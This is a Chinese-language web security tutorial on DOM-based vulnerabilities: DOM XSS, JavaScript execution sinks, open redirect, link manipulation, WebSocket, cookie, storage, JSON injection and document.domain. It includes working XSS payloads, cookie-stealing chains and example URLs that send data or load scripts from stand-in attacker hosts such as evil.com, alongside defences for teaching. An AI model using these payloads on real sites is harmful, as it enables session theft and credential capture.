**代码解释：** 这个 iframe payload 演示了如何无需用户交互就触发 `hashchange` 事件。`src` 属性加载了目标页面，并附带一个空的 `#`（这确保页面加载后 hash 存在但为空）。当 iframe 加载完成后，`onload` 事件触发，JavaScript 代码将 XSS payload 追加到 `this.src` 的 hash 部分（`#<img src=1 onerror=alert(1)>`）。由于修改了 iframe 的 URL hash，目标页面中的 `hashchange` 事件处理器被触发，执行恶意代码。这种技术在无法直接让受害者点击恶意链接时特别有用 -- 只需诱导受害者访问嵌入了此 iframe 的页面即可。

更新版本的 jQuery 已修补了此特定漏洞（当输入以 `#` 开头时阻止 HTML 注入），但如果在实际环境中遇到旧版 jQuery，或是攻击者能够从不需要 `#` 前缀的源完全控制 `$()` 的输入，此漏洞路径仍然可用。

#### AngularJS 中的 DOM XSS

AngularJS 引入了另一个攻击面：`ng-app` 指令标记的元素由 AngularJS 处理，双花括号 `{{ }}` 内的内容会被当作表达式执行。攻击者如果能够控制被 AngularJS 处理的 HTML 内容，就可以不依赖尖括号或事件处理器就执行 JavaScript。AngularJS 的沙箱逃逸曾是安全研究的热门方向，现代版本已移除沙箱（Angular 2+ 使用不同架构），但遗留应用仍需关注。

#### 反射型与存储型 DOM XSS

并非所有 DOM XSS 的数据都直接来自浏览器。数据也可以先经过服务端再回到客户端，形成复合型漏洞。

**反射型 DOM XSS** 的数据流是：攻击者构造 URL -> 服务端将 URL 参数反射到响应中（比如嵌入 JavaScript 字符串）-> 页面脚本以不安全的方式处理反射数据并写入 sink：

```javascript
eval('var data = "reflected string"');
```

**代码解释：** 这是"反射型 DOM XSS"的示例。与纯 DOM XSS（数据完全在客户端流动）不同，这里的流程是：用户请求 -> 服务端将 URL 参数反射到响应 HTML 中（比如填充到一个 JavaScript 字符串变量里）-> 页面中的 `eval()` 执行这段数据。如果攻击者构造 URL 使得"reflected string"变成恶意代码，比如注入 `"; alert(document.domain);//` 来提前闭合字符串并执行自己的代码，就能达成 XSS。这种漏洞兼具反射型 XSS 和 DOM XSS 的特征 -- 数据经过了服务端反射，但最终是在客户端 `eval()` sink 中执行的。

**存储型 DOM XSS** 的数据流则是：攻击者将恶意数据提交到服务端存储 -> 其他用户访问页面时，服务端在响应中包含该数据 -> 页面脚本不安全地处理并写入 sink：

```javascript
element.innerHTML = comment.author;
```

这两种复合形式提醒我们：DOM XSS 的源范围远不止 URL 参数。任何来自服务端并被客户端不安全处理的数据都有可能成为攻击路径。

#### 测试要点

手动测试 DOM XSS 需要区分两种不同的 sink 类型。

**HTML 汇测试：** 将一个随机字母数字字符串放入源中（如 `location.search`），使用浏览器开发者工具在 DOM 中搜索该字符串。对于找到的每个位置，识别上下文（双引号内、标签属性、文本节点等），然后尝试注入特殊字符看能否跳出上下文。"查看源代码"不适用于此类测试 -- 它显示的是服务端返回的原始 HTML，不会反映 JavaScript 对 DOM 所做的修改。

**JavaScript 执行汇测试：** 这类 sink（`eval()`、`setTimeout()` 等）不会在 DOM 中留下可见痕迹。需要使用 JavaScript 调试器，在页面源码中搜索源变量的引用位置，设置断点，逐步跟踪数据流向，确认它是否最终到达了执行汇。

**浏览器差异注意：** Chrome、Firefox 和 Safari 会对 `location.search` 和 `location.hash` 进行 URL 编码，而旧版 IE 和 Edge（Chromium 之前版本）不会。如果数据在被处理前进行了 URL 编码，XSS 攻击可能无法成功。

#### DOM XSS 完整汇列表

**原生 JavaScript 汇：**

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

**jQuery 函数汇：**

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

**防御核心原则：** 永远不要让来自不可信源的数据被动态写入 HTML 文档。如果无法避免，必须在客户端对数据进行与上下文匹配的编码和净化。

### 2.2 JavaScript 注入

JavaScript 注入与 DOM XSS 的核心区别在于：它不通过 HTML 标签或事件处理器来执行代码，而是直接将攻击者控制的字符串传入 JavaScript 的**动态代码执行函数**。

常见的执行 sink 包括：

```
eval()
Function()
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```

**Payload 解释：** 以上每个 sink 都接受字符串作为参数，并将其作为可执行代码来处理。当攻击者能够控制传入这些 sink 的数据时，就可以在受害者浏览器中执行任意 JavaScript 代码。

逐个解析：

- **`eval()`**：最经典的代码执行 sink。`eval()` 将传入的字符串当作 JavaScript 代码直接执行。例如 `eval("alert(document.cookie)")` 会弹出用户的 cookie。如果代码中存在 `eval(location.hash.slice(1))`，攻击者只需在 URL 的 hash 部分放置任意 JS 代码即可触发执行。

- **`Function()`**：`Function` 构造函数接受字符串参数并创建一个新的函数对象。`new Function("return " + userInput)()` 等效于 `eval()`，同样会执行任意代码。攻击向量与 `eval()` 类似，但由于 `Function()` 创建的是一个新函数，它在全局作用域中执行，有时可以绕过某些针对 `eval()` 的检测。

- **`setTimeout()` / `setInterval()`**：这两个定时器函数除了接受回调函数外，也接受字符串作为第一个参数。当传入字符串时，浏览器会在定时器触发时将该字符串作为 JavaScript 代码执行，行为类似于 `eval()`。例如 `setTimeout("alert(1)", 1000)` 会在 1 秒后执行弹窗。如果攻击者控制了这个字符串参数，就能实现延时或周期性的代码执行。

- **`setImmediate()` / `msSetImmediate()`**：与 `setTimeout()` 类似，`setImmediate()` 在 IE 中可用，`msSetImmediate()` 是微软的专有实现。它们同样接受字符串参数并执行。

- **`execCommand()`**：`document.execCommand()` 用于执行浏览器编辑命令。某些命令（如在旧版 IE 中）可以被滥用来执行脚本。虽然现代浏览器已大幅限制其能力，但在特定条件下仍可能被利用。

- **`execScript()`**：旧版 IE 专有的方法，类似于 `eval()`，直接将字符串作为脚本执行。在现代浏览器中已不存在，但在遗留系统中仍需关注。

- **`range.createContextualFragment()`**：将字符串解析为 DOM 片段。如果字符串中包含 `<script>` 标签，在某些浏览器或特定上下文中，该脚本可能被执行。

- **`crypto.generateCRMFRequest()`**：Firefox 专有的方法，用于生成证书请求。它接受一个字符串参数，在某些旧版本 Firefox 中，该字符串可以被解释为 JavaScript 并执行。

**核心防御要点：永远不要让来自不可信来源的数据进入上述任何一个 sink。** 即使数据经过了看似充分的过滤，攻击者也可能通过编码绕过等手段构造出可执行的 payload。最安全的做法是在架构层面避免将用户输入传入这些动态执行上下文中 -- 选择用回调函数代替字符串传给 `setTimeout()`，用 `JSON.parse()` 的静态数据结构代替 `eval()` 的动态代码执行。

---

## 三、导航劫持类漏洞

导航劫持类漏洞的共同特征是：攻击者控制了浏览器的导航目标，将受害者从合法网站引导至恶意目的地。攻击形式可能是即时跳转（开放重定向）、静默修改页面链接（链接操控），或是劫持 WebSocket 连接（WebSocket URL 投毒）。这类漏洞的危害不限于钓鱼 -- 通过 `javascript:` 伪协议或其他技巧，它们有时可以升级为任意代码执行。

### 3.1 开放重定向

DOM-based 开放重定向的产生条件是：脚本将攻击者可控的数据写入可以触发跨域导航的汇。最典型的例子：

```javascript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```

**代码解释：** 这段代码从 URL 的 hash 片段（`#` 后面的部分）中提取内容，用正则表达式 `/https?:\/\/.+/` 匹配以 `http://` 或 `https://` 开头的字符串。如果匹配成功，就把浏览器重定向到提取出的 URL。问题在于：`location.hash` 是攻击者完全可控的（通过构造链接 `https://victim.com/page#https://evil.com`），而且正则只检查了协议前缀，没有对目标域名做任何限制。攻击者可以诱导受害者点击带有恶意 hash 的链接，受害者看到的是合法域名，但浏览器会自动跳转到攻击者的网站 -- 非常适用于钓鱼攻击。更危险的是，如果攻击者能注入 `javascript:` 伪协议（取决于跳转 API 是否允许），甚至可能升级为任意 JavaScript 代码执行。

**危害等级与升级路径：** 开放重定向本身被认为是中等严重性漏洞，但它在钓鱼攻击中的实用性非常高。用户看到真实域名和有效的 TLS 锁图标，往往会忽略地址栏中 `#` 后面的内容，也不会注意到后续发生的重定向。如果攻击者能够控制传递给重定向 API 的字符串开头，还可能通过 `javascript:` 伪协议将攻击升级为 XSS。

**常见汇：**

```
location
location.host / location.hostname
location.href / location.pathname / location.search / location.protocol
location.assign() / location.replace()
open()
element.srcdoc
XMLHttpRequest.open() / XMLHttpRequest.send()
jQuery.ajax() / $.ajax()
```

**防御要点：** 避免使用不可信数据动态设置重定向目标。如果必须有此功能，使用域名白名单（而非仅检查协议或字符串包含关系）。

### 3.2 链接操控

链接操控发生在脚本将攻击者可控的数据写入页面中的导航目标（链接的 `href`、表单的 `action`、资源的 `src` 等）时。与开放重定向的"立即跳转"不同，链接操控修改的是用户未来将要交互的元素 -- 攻击更加隐蔽。

核心 sink 有三个：

```
element.href
element.src
element.action
```

**Payload 解释：** 这三个 DOM 属性都是用于控制导航或资源加载目标的 sink，当它们的值来自攻击者可控的数据源时，就会产生链接操控漏洞。

逐个解析：

- **`element.href`**：控制 `<a>` 标签的链接目标。如果代码中存在 `element.href = location.hash.slice(1)`，攻击者可以构造 `#javascript:alert(1)` 来使链接指向 JavaScript 伪协议。当用户点击该链接时，`javascript:` 协议中的代码会在当前页面的上下文中执行，实现 XSS 攻击。此外，也可以将链接指向钓鱼页面 `#https://evil.com` 来窃取用户凭证。

- **`element.src`**：控制 `<script>`、`<img>`、`<iframe>` 等标签的资源加载地址。攻击者可以将脚本的 `src` 指向恶意 JavaScript 文件，或将图片的 `src` 指向攻击者服务器来泄露信息（例如通过 URL 参数携带敏感数据）。对于 `<iframe>` 的 `src`，攻击者可以嵌入恶意页面进行点击劫持或钓鱼。

- **`element.action`**：控制 `<form>` 表单的提交目标 URL。当表单的 `action` 被攻击者操控后，用户提交的所有表单数据（包括登录凭据、个人信息、支付信息等）都会被发送到攻击者的服务器。例如 `element.action = 'https://attacker.com/collect'` 会将表单数据静默地发送到攻击者控制的地址。

**攻击示例：**

```javascript
// 不安全的代码：从 URL hash 中读取链接目标
document.getElementById('myLink').href = location.hash.slice(1);
```

攻击者构造 URL：
```
https://victim.com/page#javascript:alert(document.cookie)
```

受害者访问该 URL 后，页面中的 `<a>` 标签的 `href` 被设置为 `javascript:alert(document.cookie)`。当受害者点击该链接时，JavaScript 代码在当前域下执行。

**换行符绕过技巧：** 在某些情况下，攻击者可以在 `javascript:` payload 中使用换行符（URL 编码为 `%0a`）来绕过正则过滤。例如 `#javascript:%0aalert(1)` -- `javascript:` 协议后的换行符会被浏览器忽略，代码仍然会执行，但可能绕过了不严谨的输入过滤。

**攻击面的广度：** 链接操控可以导致用户重定向到恶意 URL（钓鱼）、将敏感表单数据提交到攻击者服务器、通过改变链接参数导致用户在应用中执行非预期操作，以及注入带有 XSS payload 的站内链接来绕过反 XSS 防御（因为反 XSS 防御通常不考虑站内链接）。

**防御要点：** 链接目标应在服务端生成或从硬编码的安全 URL 列表选取，绝不从 `location` 等不可信来源直接取值。如果必须在客户端动态设置链接，使用 URL 白名单校验，并设置 `rel="noopener noreferrer"` 属性防止 tabnabbing 攻击。

### 3.3 WebSocket URL 投毒

WebSocket URL 投毒发生在脚本使用攻击者可控的数据作为 WebSocket 连接的目标地址时：

```javascript
var ws = new WebSocket('wss://' + location.hash.slice(1));
```

**Payload 解释：** `WebSocket` 构造函数用于在浏览器中建立 WebSocket 连接，其语法为 `new WebSocket(url)`。当 `url` 参数来自攻击者可控的数据源时（例如 `location.hash`、`location.search`、`document.referrer` 等），攻击者可以使受害者的浏览器连接到攻击者控制的 WebSocket 服务器。

攻击者构造 URL：
```
https://victim.com/page#attacker-server.com:8080
```

受害者访问该 URL 后，浏览器执行的代码等价于：
```javascript
var ws = new WebSocket('wss://attacker-server.com:8080');
```

此时受害者的浏览器与攻击者的服务器建立 WebSocket 连接，而非与合法服务器通信。

**攻击利用方式：**

1. **数据窃取（Data Interception）：** 如果应用通过 WebSocket 向服务器发送敏感数据（如用户操作日志、表单输入、身份令牌等），这些数据将被直接发送到攻击者的服务器。由于 WebSocket 是全双工通信，攻击者不仅可以被动接收数据，还能主动向客户端发送消息。

2. **逻辑颠覆（Logic Subversion）：** 如果应用从 WebSocket 服务器接收数据并根据这些数据更新页面内容或执行操作，攻击者可以伪造服务器响应，使受害者浏览器执行非预期的行为。例如，攻击者可以发送伪造的交易确认消息、虚假的余额显示，甚至是恶意的客户端指令。

3. **客户端攻击投递（Client-Side Attack Delivery）：** 攻击者通过被污染的 WebSocket 连接向受害者浏览器发送恶意数据。如果应用将 WebSocket 接收到的数据直接写入 DOM（例如通过 `innerHTML`），这可以导致存储型 XSS，因为"服务端"实际上是由攻击者控制的。

4. **跨站 WebSocket 劫持（Cross-Site WebSocket Hijacking）：** WebSocket 协议不受同源策略的严格限制。如果 WebSocket 握手仅依赖 cookie 进行身份验证，攻击者可以通过污染的 URL 将受害者的 WebSocket 连接重定向到恶意服务器，利用受害者已有的认证状态。

**防御要点：** WebSocket 的目标 URL 必须在服务端生成或从可信的配置中读取，绝不能从 `location`、`document.referrer`、`postMessage` 等不受信来源获取。在客户端使用白名单校验，确保 WebSocket URL 的主机名只属于预期的合法域名。

---

## 四、数据操控类漏洞

与代码执行和导航劫持不同，数据操控类漏洞不直接执行代码或跳转页面，而是操纵浏览器中存储或使用的数据。这类漏洞的典型特征是：攻击本身可能看似低危，但往往作为攻击链中的关键环节，将"干净的"数据源转化为通往更严重漏洞的跳板。

### 4.1 Cookie 操控

DOM-based Cookie 操控的产生条件是：脚本将攻击者可控的数据写入 cookie 的值：

```javascript
document.cookie = 'cookieName=' + location.hash.slice(1);
```

**Payload 解释：** 上述代码从 `location.hash`（URL 中 `#` 之后的部分）中提取攻击者可控的数据，并将其直接写入 `document.cookie`，完全没有经过任何校验或过滤。

攻击流程：

1. 攻击者构造恶意 URL，例如：`https://victim.com/page#attacker-controlled-value`
2. 受害者访问该 URL 后，页面中的 JavaScript 代码执行 `location.hash.slice(1)`，得到 `attacker-controlled-value`
3. 该值被拼接到 `document.cookie = 'cookieName=attacker-controlled-value'`，导致受害者浏览器的 cookie 被设置为攻击者指定的值

这个漏洞的危害主要体现在以下两个方面：

**Session Fixation（会话固定攻击）：** 如果被操控的 cookie 用于跟踪用户会话（例如 `sessionId`），攻击者可以先从目标网站获取一个有效的会话令牌，然后通过构造 URL 让受害者将该 cookie 值设置为攻击者已知的令牌。受害者在之后的交互中会使用这个已被攻击者知晓的会话，攻击者便能劫持受害者的会话，以受害者的身份执行操作。

**Exploit Chaining（漏洞利用链）：** Cookie 操控本身看似危害有限，但它可以作为整个攻击链中的一环。例如，如果网站将 cookie 中的值未经 HTML 编码就反射到页面中，攻击者可以先通过 cookie 操控注入恶意脚本，再借助反射行为触发 XSS。同样，如果 cookie 控制着某些应用逻辑（如用户角色、功能开关），攻击者可以通过操纵 cookie 来提升权限或触发非预期的行为。

此外，由于 cookie 的作用域机制，这类漏洞不仅影响漏洞所在的网站，还可能影响同一父域名下的所有其他子域名站点。

**防御要点：** 避免使用来自任何不可信源的数据动态写入 cookie。

### 4.2 HTML5 存储操纵

HTML5 存储操纵本身不是独立的安全漏洞，而是**攻击链中的存储环节**。攻击者通过以下模式分两步完成攻击：

**第一步 -- 污染存储：** 攻击者构造恶意 URL，利用页面中的 JavaScript 将 URL 中的攻击者可控参数写入 `localStorage` 或 `sessionStorage`：

```javascript
// 漏洞代码示例
var theme = new URLSearchParams(location.search).get('theme');
localStorage.setItem('theme', theme);
// 攻击者访问: /page?theme=<img src=x onerror=alert(1)>
// 此时 localStorage 中 theme 键的值被污染为恶意 payload
```

**第二步 -- 触发利用：** 应用的其他部分从存储中读取这些数据并以不安全的方式使用，最终形成完整攻击链：

```javascript
// 另一处代码从存储中读取并使用
document.getElementById('wrapper').innerHTML = localStorage.getItem('theme');
// 或者用 eval 等危险函数处理
```

**代码解释：** `sessionStorage.setItem()` 和 `localStorage.setItem()` 是 HTML5 Web Storage API 中向浏览器存储写入数据的方法。它们本身不是漏洞，而是攻击链中的"存储环节"。`setItem()` 只是把数据写入键值存储，不会执行任何代码。只有当应用后续从存储中读取数据，并将其传递给危险的 DOM sink（如 `innerHTML`、`eval()`、`document.write()` 等）时，攻击才能完成。因此 HTML5 存储操纵必须与其他漏洞（如 DOM XSS）组合才能形成有效攻击。

`sessionStorage` 和 `localStorage` 的区别在于持久性：`sessionStorage` 的数据仅在当前标签页会话期间存在，污染范围相对有限；`localStorage` 的数据持久化存储，即使关闭标签页或浏览器后依然存在，污染后影响更持久，受害者可能在完全不同的时间点触发攻击。

**典型完整攻击链：**

```javascript
// 第一步：通过 URL 参数污染 localStorage（页面 A）
// 攻击者诱导受害者访问: /pageA?userData=<img src=x onerror=fetch('/steal?cookie='+document.cookie)>
var data = location.search.split('userData=')[1];
localStorage.setItem('cachedData', data);

// 第二步：页面 B 不安全地读取并渲染（形成完整的 DOM XSS）
document.body.innerHTML = '<div>' + localStorage.getItem('cachedData') + '</div>';
```

**防御思路：** 不要将未经验证的外部输入写入 HTML5 存储；从存储中读取数据时，避免将其直接传递给 `innerHTML`、`eval()` 等危险 sink；对写入存储的数据进行校验和净化；使用 `textContent` 替代 `innerHTML` 来安全地展示用户数据。

### 4.3 DOM 数据操纵

DOM 数据操纵涵盖了一组极为丰富的 sink，允许攻击者篡改页面的 DOM 属性或内容。危害范围从轻度（页面篡改）到严重（任意代码执行）。

核心 sink 列表：

```
script.src
script.text
script.textContent
script.innerText
element.setAttribute()
element.search
element.text
element.textContent
element.innerText
element.outerText
element.value
element.name
element.target
element.method
element.type
element.backgroundImage
element.cssText
element.codebase
document.title
document.implementation.createHTMLDocument()
history.pushState()
history.replaceState()
```

**代码解释：** DOM 数据操纵涵盖了一组极为丰富的 sink，它们允许攻击者篡改页面的 DOM 属性或内容，从而实现从轻度（页面篡改）到严重（任意代码执行）的攻击。以下按危险等级分类详述：

---

**一、高危 sink -- 可导致任意 JavaScript 执行**

**1. `script.src` -- 加载恶意外部脚本（最危险之一）**

```javascript
// 漏洞代码示例
var script = document.createElement('script');
script.src = location.hash.slice(1); // 攻击者控制 src
document.body.appendChild(script);
// 攻击者访问: /page#https://evil.com/malicious.js
// 结果: 恶意 JS 文件被加载并在受害者浏览器中执行，完全控制页面
```

`script.src` 是最危险的 DOM 数据操纵 sink 之一。攻击者可以注入任意外部脚本 URL，浏览器会自动下载并执行该脚本，导致完全的 XSS。即使页面使用了 CSP（内容安全策略），如果策略中存在 `script-src` 的白名单绕过路径，攻击仍可能成功。

**2. `element.setAttribute()` -- 修改任意属性（包括事件处理器）**

```javascript
// 漏洞代码示例
var el = document.getElementById('btn');
var attrName = new URLSearchParams(location.search).get('attr');
var attrValue = new URLSearchParams(location.search).get('val');
el.setAttribute(attrName, attrValue);
// 攻击者访问: /page?attr=onclick&val=alert(document.cookie)
// 结果: 按钮被注入 onclick 事件处理器，点击后执行恶意代码
```

`setAttribute()` 的危险之处在于：如果攻击者同时控制属性名和属性值，可以注入任意 HTML 事件处理器（`onclick`、`onerror`、`onload`、`onfocus` 等），实现 XSS。即使只控制属性值（属性名固定），如果属性名恰好是 `href`、`src`、`action` 等，也能实现脚本注入或钓鱼攻击。

```javascript
// 只控制属性值的危险场景
link.setAttribute('href', location.hash.slice(1));
// 攻击者: /page#javascript:alert(document.cookie)
// 用户点击链接后执行恶意 JS
```

**3. `script.text` / `script.textContent` / `script.innerText` -- 向脚本元素注入代码**

这几个 sink 允许直接向 `<script>` 元素写入代码内容：

```javascript
// 向已存在的 <script> 元素注入代码
var s = document.createElement('script');
s.textContent = location.hash.slice(1);
document.body.appendChild(s);
// 攻击者: /page#alert(document.cookie)
// 结果: 直接执行攻击者提供的 JavaScript 代码
```

---

**二、中危 sink -- 可导致页面内容或行为篡改**

**4. `document.title` -- 修改页面标题（钓鱼攻击）**

```javascript
// 漏洞代码
document.title = location.hash.slice(1);
// 攻击者: /page#Urgent Security Alert - Please Login
// 效果: 标签页标题被篡改，可能用于社会工程学攻击
```

`document.title` 看起来无害，但可以用于钓鱼攻击（将标签页标题改为银行名或安全警告）、标签页闪烁攻击（设置为 Unicode 不可见字符使标题消失）、或信息泄露（如果页面通过 `document.title` 向第三方传输数据）。

**5. `element.value` / `element.name` / `element.target` / `element.method` / `element.type` / `element.action` -- 表单操纵**

```javascript
// 漏洞代码
var form = document.getElementById('loginForm');
form.action = location.hash.slice(1);
// 攻击者: /page#https://evil.com/steal-credentials
// 用户提交登录表单后，凭据被发送到攻击者服务器

form.method = 'GET'; // 将 POST 改为 GET，使凭据出现在 URL 中便于窃取
form.target = '_blank'; // 改变表单提交目标窗口
var input = document.getElementById('username');
input.name = 'password'; // 交换字段名，破坏后端逻辑
input.value = 'auto-filled-malicious-value'; // 预填充恶意值
```

**6. `element.backgroundImage` / `element.cssText` / `element.codebase` -- 样式/外观篡改**

```javascript
// CSS 注入导致的外观篡改
element.cssText = location.hash.slice(1);
// 攻击者: /page#background-image:url(https://evil.com/tracker)
// 效果: 触发外部请求，可用于追踪或数据外带

element.backgroundImage = 'url("https://evil.com/steal?cookie=" + document.cookie + "")';
// 注意: 实际中 URL 内的 JS 表达式不会执行，但 URL 本身可以向外部发送信息
```

---

**三、低危但值得关注的 sink**

**7. `history.pushState()` 和 `history.replaceState()` -- 浏览器历史操纵**

```javascript
// 漏洞代码
history.pushState({}, '', '/page/' + location.hash.slice(1));
// 攻击者: /page#/admin
// 效果: 地址栏显示 /page/admin，但实际页面未变化

// 用于钓鱼:
history.replaceState({}, '', 'https://legitimate-bank.com/login');
// 页面实际仍是攻击者控制的，但地址栏显示合法域名（仅在同源条件下部分生效）
```

这两个 API 可以操纵浏览器地址栏显示的 URL 而不实际发起导航。攻击用途包括：钓鱼攻击（使受害者误以为自己身处合法网站）、阻止用户离开（在 `popstate` 事件中注入恶意逻辑）、配合其他漏洞隐藏恶意 URL 参数。

**8. `element.textContent` / `element.innerText` / `element.text` / `element.outerText` -- 文本内容篡改**

```javascript
// 漏洞代码
var welcomeMsg = document.getElementById('welcome');
welcomeMsg.textContent = 'Welcome, ' + location.search.split('name=')[1];
// 攻击者: /page?name=admin<script>alert(1)</script>
// 注意: textContent 不会执行 HTML，脚本标签会被当作文本展示，所以 XSS 不可行
// 但可用于页面篡改、社会工程学攻击
```

这些 sink 只设置元素的文本内容，不会解析 HTML，因此无法直接实现 XSS。但可用于虚拟页面篡改（virtual defacement）、钓鱼攻击（修改按钮文字、提示信息）、误导用户执行危险操作。

**9. `element.search` -- 修改 URL 查询参数**

```javascript
// 漏洞代码
var link = document.getElementById('api-link');
link.search = location.hash.slice(1); // 修改 <a> 或 <area> 元素的查询字符串
// 被用于操纵链接的查询参数，可能改变 API 请求的参数
```

---

**防御思路汇总：** 永远不要将未经验证的用户输入写入 DOM 属性。如果必须使用，采用白名单校验。设置严格的 CSP 策略限制可执行脚本的来源。永远不要允许用户控制 `setAttribute()` 的属性名参数。对 `src`、`href`、`action` 等 URL 类型属性进行协议白名单检查（只允许 `https:` 和 `/` 开头的值）。用 `textContent` 替代 `innerHTML`，用 `encodeURIComponent()` 编码 URL 参数。

### 4.4 客户端 JSON 注入

JSON 注入的漏洞模式与 SQL 注入有相似之处：开发者通过字符串拼接构建 JSON 数据，攻击者利用未净化的用户输入注入额外的键值对，从而篡改被解析的对象结构。

核心汇：

```
JSON.parse()
jQuery.parseJSON()
$.parseJSON()
```

**代码解释：** `JSON.parse()` 和 jQuery 的 `$.parseJSON()` 本身是将 JSON 字符串转换为 JavaScript 对象的解析器。漏洞的根源不在于解析过程，而在于**攻击者可控的数据被拼接到 JSON 字符串中之后才被解析**，从而允许攻击者注入任意的 JSON 属性或值。

**典型漏洞模式 -- 字符串拼接：**

```javascript
// 漏洞代码：直接从 URL hash 读取数据拼接到 JSON 字符串中
var input = location.hash.slice(1); // 获取 hash 值，去掉开头的 #
// 攻击者访问: /page#admin","role":"superadmin
var jsonStr = '{"user":"guest","name":"' + input + '","role":"user"}';
var obj = JSON.parse(jsonStr);
// 解析结果 JSON 变成:
// {"user":"guest","name":"admin","role":"superadmin","role":"user"}
// 注意: 存在两个 "role" 键，大多数 JSON 解析器取最后一个值 "user"
// 但如果注入时构造得当，可覆盖前面的键值
```

**权限提升示例 -- 覆盖 `isAdmin` 字段：**

```javascript
// 原始代码:
var userData = '{"username":"' + location.search.split('name=')[1] + '","isAdmin":false}';
var user = JSON.parse(userData);
if (user.isAdmin) {
    showAdminPanel();
}
```

攻击者构造 URL `/page?name=attacker","isAdmin":true,"x":"`，拼接后的 JSON 变成 `{"username":"attacker","isAdmin":true,"x":"","isAdmin":false}`。解析结果的 `isAdmin` 值取决于 JS 引擎对重复键的处理策略 -- 大多数现代 JS 引擎取最后一个值，但无论哪种策略，攻击者都能通过精心构造来影响解析结果。

**JSON 注入的几种攻击目标：**

1. **权限提升（覆盖关键属性）：** 如果被解析的 JSON 对象包含 `isAdmin`、`role`、`permissions` 等控制逻辑的属性，攻击者可以注入这些属性并设为恶意值。

2. **逻辑绕过（注入额外字段）：** 如果代码根据 JSON 中的 `action` 字段决定执行什么操作，攻击者可以注入任意的 action 值来执行非预期操作。

3. **升级为代码注入：** 如果 JSON 解析后的结果被进一步传入 `eval()` 或 `new Function()`，注入可以升级为任意代码执行。不过这已超出了纯 JSON 注入的范畴，属于不安全的后续使用。

4. **数据泄露：** 如果 JSON 中的某个字段被用作 URL 或跳转目标，可以注入恶意地址。

**关于三个 sink 的说明：** `JSON.parse()` 是原生 JavaScript 方法，`jQuery.parseJSON()` 和 `$.parseJSON()` 是 jQuery 提供的封装（jQuery 3.0 起已废弃，内部直接调用 `JSON.parse`）。三个 sink 功能一致，漏洞根源始终是**拼接时未净化**，而非解析器本身有问题。

**正确做法 -- 用 `JSON.stringify()` 替代字符串拼接：**

```javascript
// 安全写法
var obj = { username: input, isAdmin: false };
var jsonStr = JSON.stringify(obj); // input 中的引号等特殊字符会被自动转义
```

**防御思路：** 不要将用户输入直接拼接到 JSON 字符串中。正确的做法是先构建 JavaScript 对象，再用 `JSON.stringify()` 序列化 -- 特殊字符会被自动转义。如果必须拼接，确保对用户输入进行严格的 JSON 转义（至少转义 `"`、`\` 和控制字符）。解析 JSON 后，对关键属性进行二次校验，不依赖 JSON 中声明的权限字段。


# 五、源验证与沙箱绕过

前文讨论的漏洞大多遵循"源到汇"的污点流模型：攻击者控制的数据直接流入危险的 DOM 操作。但有一类漏洞更为隐蔽——它们不直接操作页面内容，而是通过破坏浏览器的安全边界来间接达成攻击目标。这些漏洞涉及同源策略的绕过、跨窗口通信的滥用以及 HTTP 请求头的操控。

## 5.1 document.domain 操控

### 背景：同源策略

同源策略（Same-Origin Policy）是浏览器安全模型的基石。它规定：只有当两个页面的协议（protocol）、主机名（hostname）和端口（port）完全相同时，它们才能互相访问对方的 DOM、Cookie 和 JavaScript 执行上下文。例如，`https://a.example.com` 和 `https://b.example.com` 被视为不同源，默认情况下无法通过 JavaScript 读取对方的内容。

### document.domain 如何放宽同源策略

`document.domain` 属性允许页面在特定条件下放宽这一限制。如果两个来自不同子域的页面都将 `document.domain` 设置为相同的父域名（例如都设为 `example.com`），它们就可以彼此交互。

### 攻击手法

DOM-based document.domain 操控漏洞的产生条件是：脚本使用攻击者可控制的数据来设置 `document.domain` 属性。

```javascript
// 从 URL 片段中读取攻击者控制的值并设置 document.domain
document.domain = location.hash.slice(1);
```

**代码解释：**

- `location.hash` 获取 URL 中 `#` 后面的部分，这是攻击者可以完全控制的 DOM source。例如，攻击者构造 URL：`https://victim.com/page#attacker.com`。
- 设置 `document.domain` 可以**放宽**同源策略的限制。攻击者在 `attacker.com` 上拥有一个页面。如果受害者页面将 `document.domain` 设为 `attacker.com`，那么攻击者的页面就可以**完全控制**受害者页面的 DOM——效果等同于 XSS。
- 浏览器允许将 `document.domain` 设置为当前域的父域或子域。例如，`sub.victim.com` 可以将 `document.domain` 设为 `victim.com`。攻击者如果控制了 `victim.com` 的某个子域，就能利用这个机制攻击其他子域。
- 某些浏览器的历史怪异行为甚至允许设置完全无关的域名，进一步扩大了攻击面。

**攻击链路：** 攻击者构造恶意 URL 并诱使受害者访问 -> 受害者页面从 `location.hash` 读取值并设置 `document.domain`（例如设为 `attacker.com`） -> 攻击者在 `attacker.com` 上的页面也设置 `document.domain = 'attacker.com'` -> 由于两个页面现在"同源"，攻击者可以读写受害者页面的所有内容。

浏览器通常对可赋值给 `document.domain` 的值施加了限制，但有两个重要的注意点：第一，浏览器允许使用子域或父域，因此攻击者可能将目标页面切换到安全态势较弱的关联网站；第二，某些浏览器的怪异行为使得可以切换到完全不相关的域。操控 `document.domain` 的能力通常代表着一个严重性不亚于 XSS 的安全漏洞。

### 防御

核心原则：永远不要使用来自不可信源的数据来动态设置 `document.domain`。如果确实需要跨子域通信，应使用 `postMessage()` API 并严格验证消息来源。

## 5.2 Web Message 操控

### postMessage() 的工作机制

`postMessage()` 是 HTML5 提供的跨文档通信 API，允许不同源的窗口（包括 iframe、弹出窗口等）之间安全地传递消息。它的基本用法是：

```javascript
// 发送端
targetWindow.postMessage(message, targetOrigin);
```

- 第一个参数是消息数据，可以是字符串或结构化对象。
- 第二个参数指定接收窗口的期望源（origin）。传入 `'*'` 表示不限制目标源（通配符用法）。

接收端通过监听 `message` 事件来获取消息：

```javascript
// 接收端
window.addEventListener('message', function(event) {
    // event.data   — 消息内容
    // event.origin — 发送方的源
    // event.source — 发送方的窗口引用
});
```

### 双重角色：postMessage 既是汇也是源

在安全分析中，`postMessage()` 扮演着双重角色：

- **作为 sink：** 发送消息的一方如果从攻击者可控的源（如 `location.hash`）读取数据并通过 `postMessage()` 发出，攻击者就能控制消息的内容。这对应于 "Web Message 操控"——攻击者操控了传出的消息数据。
